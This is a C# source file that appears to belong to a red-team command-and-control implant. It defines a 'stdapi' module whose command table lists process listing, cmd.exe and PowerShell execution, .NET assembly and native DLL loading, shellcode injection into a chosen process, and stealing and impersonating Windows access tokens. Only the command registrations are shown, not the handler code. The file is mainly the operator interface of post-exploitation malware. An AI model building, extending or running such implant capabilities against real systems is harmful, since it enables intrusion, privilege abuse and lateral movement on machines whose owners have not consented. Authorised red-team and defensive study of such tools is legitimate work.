using System.Collections.Generic;

using Drone.Modules;

namespace StandardApi
{
    public partial class StandardApi : DroneModule
    {
        public override string Name => "stdapi";

        public override List<Command> Commands => new()
        {
            new Command("ps", "List running processes", GetProcessListing),
            new Command("services", "List services on the current or target machine", ListServices,
                new List<Command.Argument>
                {
                    new("computerName")
                }),
            new Command("shell", "Run a command via cmd.exe", ExecuteShellCommand,
                new List<Command.Argument>
                {
                    new("args", false)
                }),
            new Command("run", "Run a command", ExecuteRunCommand, new List<Command.Argument>
            {
                new("args")
            }),
            new Command("powershell-import", "Import a PowerShell script", PowerShellImport,
                new List<Command.Argument>
                {
                    new("/path/to/script.ps1", false, true)
                }),
            new Command("powershell", "Execute PowerShell via an unmanaged runspace", PowerShellExecute,
                new List<Command.Argument>
                {
                    new("command", false)

                }, hookable: true),
            new Command("execute-assembly", "Execute a .NET assembly", ExecuteAssembly,
                new List<Command.Argument>
                {
                    new("/path/to/assembly.exe", false, true),
                    new("args")
                }, hookable: true),
            new Command("overload", "Map and execute a native DLL", OverloadNativeDll,
                new List<Command.Argument>
                {
                    new("/path/to/file.dll", false, true),
                    new("export-name", false),
                    new("args")
                }, hookable: true),
            new Command("shinject", "Inject arbitrary shellcode into a process", ShellcodeInject,
                new List<Command.Argument>
                {
                    new("/path/to/shellcode.bin", false, true),
                    new("pid", false)
                }),
            new Command("list-tokens", "List tokens in the token store", ListTokens),
            new Command("delete-token", "Remove and dispose this token from the token store", DisposeToken,
                new List<Command.Argument>
                {
                    new("handle", false)
                }),
            new Command("use-token", "Use a token in the token store", UseToken,
                new List<Command.Argument>
                {
                    new("handle", false)
                }),
            new Command("make-token", "Create and impersonate a token with the given credentials", MakeToken,
                new List<Command.Argument>
                {
                    new("DOMAIN\\username", false),
                    new("password")
                }),
            new Command("steal-token", "Duplicate and impersonate the token of the given process", StealToken,
                new List<Command.Argument>
                {
                    new("pid", false)
                }),
            new Command("rev2self", "Drop token impersonation", RevertToSelf)
        };
    }
}